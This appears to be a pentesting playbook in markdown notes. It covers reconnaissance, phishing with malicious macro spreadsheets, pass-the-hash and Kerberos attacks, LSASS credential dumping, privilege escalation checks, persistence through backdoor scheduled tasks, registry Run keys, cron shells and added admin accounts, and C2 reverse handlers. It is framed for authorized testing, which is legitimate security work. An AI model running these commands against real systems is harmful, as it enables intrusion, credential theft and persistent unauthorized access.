This document is meant to serve as a platform-agnostic general overview for pentesting.
# Recon
See [External Reconnaissance](../2.%20Scanning%20and%20Enumeration/External%20Reconnaissance.md)
## Passive Reconnaissance
1. Look for registrar information. WHOIS, etc.
2. Look for data breaches
3. Look at social media accounts
4. Move to active recon
## Active Reconnaissance
### Scanning and Enumeration
1. `nmap`
2.  `msfconsole` 
	1. for all discovered technologies
3. Startpage each enumerated technology when a version number is found. Look for CVEs, exploits/tools, write ups
4. [`autorecon.sh`](https://pastebin.com/MhE6zXVt)
5. If webapp, navigate through while using Caido to review Response data in proxy
6. if SMB
	1. list shares via: `smbclient -L \\192.168.1.42\`
		1. try anonymous connection on existing shares: `smbclient \\192.168.1.42\IPCS$`
# Exploitation
See [Active Directory Playbook](../3.%20Gaining%20Access%20and%20Persistence/Post%20Compromise/Active%20Directory%20Playbook.md)'s Windows Active Directory Recon section for explicit information on pwning services, not people.
## Common Initial Foothold
>Most initial footholds are gained by malicious email attachments or exploits against the user's browser.
#### Example workflow:
1. See if domain is Spoofable using [Spoofy](https://github.com/MattKeeley/Spoofy)
2. Create malicious macro'd excel sheet using the [Nishang framework](https://github.com/samratashok/nishang)
3. Email excel sheet; use MSFconsole as C2 server(see [Spear Phishing Techniques](https://azeria-labs.com/initial-compromise/) section)

Be intentional with the script you choose to embed in the excel spreadsheet. It doesn't have to be complicated, and you don't necessarily need the MSFconsole, you can embed a `DownloadString`(see [PowerShell Evasion](../Power%20Commands/PowerShell/PowerShell%20Evasion.md)) call and use `netcat` as your listener.

> Source: https://azeria-labs.com/initial-compromise/
#### Subdomain Enumeration and Brute Forcing 
1. Phonebook.cz or Hunter.io; save emails to list for later password spraying
2. Subdomain Enumeration: `gobuster dns` or `amass intel`
3. Directory Busting: `gobuster dir` the top level domain (TLD)
	1. then, directory bust all found subdomains
4. Brute Force Login Pages: `hydra`
# Post-Exploitation & Enumeration
## Local System Enumeration
- **Local System Enumeration:** You have a shell. Now what?
    - **User Context:** Who are you? (`whoami`, `ipconfig /all`, `env`)
    - **System Info:** What OS, architecture, patches? (`systeminfo`)
    - **Running Processes/Services:** What's running? Can you hijack one? (`ps`, `tasklist`). Maybe then check [DLL Hijacking Pentest Cheat Sheet](../3.%20Gaining%20Access%20and%20Persistence/Windows%20Persistence/DLL%20Hijacking/DLL%20Hijacking%20Pentest%20Cheat%20Sheet.md)
    - **Network Connections:** What other systems is this box talking to? (`netstat -ano`)
    - **Filesystem:** Looking for passwords, config files, sensitive data (e.g., `C:\Users\*\Documents\`, `C:\Windows\Panther\Unattend.xml`).
    - **Privilege Analysis:** What are your rights? (`whoami /priv`, `sudo -l` on Linux)
- **Domain Enumeration (If in an AD environment):** map the domain structure, users, groups, computers, and trusts to identify paths for privilege escalation and lateral movement
    - Tools: `PowerView`, `BloodHound`, `net user /domain`, `net group "Domain Admins" /domain`. Also see [Active Directory Playbook](../3.%20Gaining%20Access%20and%20Persistence/Post%20Compromise/Active%20Directory%20Playbook.md)'s Tools section
## Lateral Movement
### Uncredentialed Lateral Movement
> Source: [2](https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide)
1. A quick win is often running a tool such as Responder or Pretender to perform either LLMNR/NBT-NS Response Spoofing or DNS Spoofing over IPv6 to obtain NTLMv1 or NTLMv2 (more common nowadays) password hashes to either crack offline using Hashcat or perform an SMB Relay attack to dump domain data or gain local admin access to a host. 
2. If we find that one or more domain controllers are configured to allow SMB NULL sessions or LDAP anonymous binds, we can dump a list of all AD users along with the domain password policy and mount a password spraying attack using a tool such as Kerbrute. If we are fortunate enough to obtain the domain password policy, we are generally safe with multiple password spray attempts, provided that we are operating within the bounds of the password policy and not locking accounts out. We only need one hit (successful password spray) to begin our AD enumeration/attacks.
3. If the first two options are not working, we can build our own user list to enumerate valid AD user accounts with Kerbrute. I typically start by scraping the target company’s LinkedIn page using linkedin2username and testing for valid accounts against that list. I will usually get some hits here. Once I know the username format (i.e., jsmith or john.smith), I can proceed to perform further enumeration using one of the lists, such as jsmith.txt, from the statistically-likely-usernames GitHub repo. Armed with this list, I can perform 1-2 password spray attempts with a common password such as Welcome1 and then the season + year or month + year (i.e., Spring2023 or March2023). Not knowing the password policy, I usually would not go any further, so I will sometimes ask the client if they are willing to provide it. If not, then I will move on to not risk locking out one or many AD user accounts.
4. If none of the above work, perhaps we can find a system vulnerable to a known exploit that we can land a SYSTEM shell on. If the machine is domain-joined, then this is just as good as any AD user account to start performing our enumeration.
5. Any number of attacks that can be used to coerce NTLM authentication. One example is PetitPotam which sometimes can be used to perform an NTLM relaying attack without requiring valid AD user credentials if AD CS is present and configured on a domain controller instead of a separate server.
### Credentialed Lateral Movement
> Once you have obtained credentials or hashes.
> Source: [2](https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide)
1. When we have a valid AD user account, the first step is typically to get a lay of the land. We can do this very effectively with BloodHound and begin to map out attack paths, such as hosts we may have local admin on or potential users/computers to target. We could also use PowerView or many other tools to enumerate information about key AD objects and their permissions. 
2. Active Directory Certificate Services (AD CS) presents a vast attack surface, so it's always worth checking to see if it is present and then enumerating for possible misconfigurations using Certipy or Certify. When present, a misconfiguration could quickly lead to Domain Admin level access, or complete administrative control over the AD domain.
3. We could also perform “roasting” attacks such as Kerberoasting or ASREPRoasting. The success of these attacks depends on an account having a weak password set, but if we can obtain and crack a password hash, we may gain access to an account that can help us move further toward our goal or even go direct to Domain Admin. (_Related read: [What is Kerberos security and authentication?](https://www.hackthebox.com/blog/what-is-kerberos-authentication)_)
4. We could potentially perform a DACL attack, exploit a misconfigured GPO, leverage group membership that allows for Remote Desktop (RDP) access to a host and then escalate privileges, find a password in a user or computer’s description field, or find a password in a Group Policy preferences file.
5. Often we can pull off more advanced Kerberos delegation attacks such as Resource- Based Constrained Delegation (RBCD), relaying to AD CS using PetiPotam, the Shadow Credentials attack, and others that are outside the scope of this post. **Recommended read:** [8 Powerful Kerberos attacks (that analysts hate).](https://www.hackthebox.com/blog/8-powerful-kerberos-attacks)
6. Sometimes we are getting nowhere and must resort to digging around shares for juicy data, such as a user that keeps all their passwords in a .txt file or spreadsheet; a web.config file with an MSSQL service account password; a VMDK backup of a host that we can pull the local administrator password hash from and re-use across other systems, and more. PowerView or CrackMapExec can be used for this purpose, but one of my favorite tools for digging in shares is [Snaffler](https://github.com/SnaffCon/Snaffler). Another excellent tool for digging into shares and performing a permissions audit on shares is [PowerHuntShares](https://github.com/NetSPI/PowerHuntShares). Similar to how we mentioned PingCastle earlier, we can use this tool to provide extra, more granular data for our clients so they can work on their file share permissions which can be very difficult to maintain correctly, especially in large environments.
#### Power Commands
1. **Pass-the-Hash (PtH):** Use a captured NTLM hash to authenticate without the plaintext password.
    - `crackmapexec smb <target_IP_range> -u 'user' -H '<NTLM_hash>'
    - `psexec.py 'user'@'target_IP' -hashes '<LM_hash>:<NTLM_hash>'`
2. **Pass-the-Ticket (PtT):** Use a stolen Kerberos TGS ticket to impersonate a user.
    - Inject a ticket into memory with `Rubeus.exe ptt /ticket:<ticket.kirbi>` or on Linux, `export KRB5CCNAME=<ticket.ccache>`.
3. **Remote Service Execution:
    - **WMI:** `wmic /node:"target" /user:"user" /password:"pass" process call create "cmd.exe /c <command>"
    - **PsExec:** `psexec.exe \\target -u user -p pass cmd.exe
    - **WinRM:** `evil-winrm -i target -u user -p pass
4. **SSH:** If SSH is enabled on Linux hosts, use captured credentials to connect.
## Privilege Escalation
### Windows Privilege Escalation
1. **Enumeration is Key:** Run scripts to find misconfigurations.
    - **WinPEAS:** `winpeasany.exe` (All checks) or `winpeas.exe quiet cmd fast` (Quicker)
    - **PowerSploit:** `PowerUp.ps1` - Find misconfigured services, ACL issues, etc.
    - **Seatbelt:** `Seatbelt.exe -group=all` - Broad system enumeration.
2. **Common Vectors:**
    - **Service Misconfigurations:** Unquoted service paths, insecure service permissions, writable service binaries.
    - **AlwaysInstallElevated:** Check if these registry keys are enabled (1). If so, `msiexec /quiet /qn /i malicious.msi`
    - **Potato Attacks:** `JuicyPotato`, `PrintSpoofer`, `RoguePotato` to leverage SeImpersonate privileges.
    - **Kernel Exploits:** Use `windows-exploit-suggester.py` or `Watson` to find missing patches. **WARNING:** Can be unstable (BSOD). Get approval.
    - **Credentials:** Search for passwords in files, registry, memory. `procdump.exe` on LSASS and parse with `pypykatz`.
### Linux Privilege Escalation
1. **Common Vectors:
    - **SUID/GUID Binaries:** `find / -perm -u=s -type f 2>/dev/null`. Can any be exploited? (See GTFOBins).
    - **Sudo Rights:** `sudo -l`. Can you run anything as root? (e.g., `sudo vi /root/file` -> `:!bash`).
    - **Capabilities:** `getcap -r / 2>/dev/null`. (e.g., `cap_setuid+ep` on a binary).
    - **Cron Jobs:** Are any writable? Can you write over the script they execute?
    - **Kernel Exploits:** `uname -a` to get kernel version. Search for exploits. **WARNING:** Unstable. Get approval.
    - **Writable Paths:** Is `$PATH` modifiable? Can you replace a binary like `ls` with a malicious one?
2. **Enumeration Scripts:**
    - **LinPEAS:** The gold standard. `./linpeas.sh`
    - **LinuxSmartEnumeration:** `./lse.sh -l 1`
    - **LinEnum:** `./linenum.sh
## Persistence
### Common Techniques
- **Windows:
    - **MSF:** Use the `persistence` module.
    - **Scheduled Tasks:** `schtasks /create /tn "WindowsUpdate" /tr "C:\shell.exe" /sc onstart /ru SYSTEM
    - **Service:** `sc create "TempService" binpath= "C:\shell.exe" start= auto && sc start TempService`
    - **Registry:** `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Backdoor" /t REG_SZ /d "C:\shell.exe"
- **Linux:
    - **Cron Jobs:** `echo "* * * * * /tmp/shell.sh" | crontab -
    - **SSH Keys:** Append your public key to `/home/<user>/.ssh/authorized_keys` or `/root/.ssh/authorized_keys`.
    - **Systemd Service:** Create a new service file in `/etc/systemd/system/` with your reverse shell command.
- **Cross-Platform:
    - **Web Shell:** Upload a persistent web shell (e.g., ASPX, PHP) to a writable directory.
    - **Add a User:** `net user hacker Password123! /add && net localgroup administrators hacker /add` (Windows) or `useradd -ou 0 -g 0 hacker` (Linux). _Easy to detect._
### Command and Control
> Frameworks that manage implants, handle encryption, and provide a centralized interface for operating on compromised hosts.
- **Metasploit (`msfconsole`):** The classic. Use `handler -p windows/x64/meterpreter/reverse_http -H <ip> -P <port>` as a multi/handler.
- **Covenant:** .NET-based C2 focused on AD environments. Highly customizable.
- **Mythic:** Modern, containerized framework with JSON-based messaging. Supports many agents (Apollo, Athena).
- **Havoc:** A modern, post-exploitation command and control framework, written in C++, with support for sleep obfuscation.
- **Sliver:** Written in Go, lightweight and cross-platform. A popular alternative to Cobalt Strike.

---
# Resources
1. Azeria Labs: APTs https://azeria-labs.com/advanced-persistent-threat/
2. Active directory pentesting: cheatsheet and beginner guide: https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide
#recon #playbook #exploitation #initial-foothold #post-exploitation #enumeration #persistence #lateral-movement #privilege-escalation #uncredentialed-access #credentialed-access 